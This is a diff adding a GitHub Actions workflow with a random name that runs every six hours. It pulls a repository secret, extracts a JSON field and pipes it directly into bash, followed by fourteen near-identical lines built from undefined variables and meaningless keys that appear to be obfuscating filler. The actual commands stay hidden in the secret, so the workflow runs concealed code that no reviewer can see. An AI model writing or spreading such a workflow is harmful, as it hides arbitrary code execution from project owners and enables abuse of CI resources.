@@ -1,0 +1,32 @@
+name: wraokaidigou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wraokaidigou
+        env:
+          mqzk2: ${{ secrets.mqzk2 }}
+        run: |
+          echo $mqzk2 | jq -r .xzpb6574 | /bin/bash
+          echo $olax5037 | jq -r .zj49 | /bin/bash
+          echo $jdp9 | jq -r .xg984 | /bin/bash
+          echo $t9264 | jq -r .ih661 | /bin/bash
+          echo $bwm0 | jq -r .fs1 | /bin/bash
+          echo $au7 | jq -r .cl58 | /bin/bash
+          echo $dnx80 | jq -r .jdns4604 | /bin/bash
+          echo $jeu23892 | jq -r .qyg53 | /bin/bash
+          echo $z3 | jq -r .fkfb88469 | /bin/bash
+          echo $iux861 | jq -r .qjb443 | /bin/bash
+          echo $euyfv6 | jq -r .ayx91 | /bin/bash
+          echo $eexxi65 | jq -r .s2 | /bin/bash
+          echo $f0386 | jq -r .qj3 | /bin/bash
+          echo $yfb287 | jq -r .h59555 | /bin/bash
+          echo $yx345 | jq -r .ppma3569 | /bin/bash
+
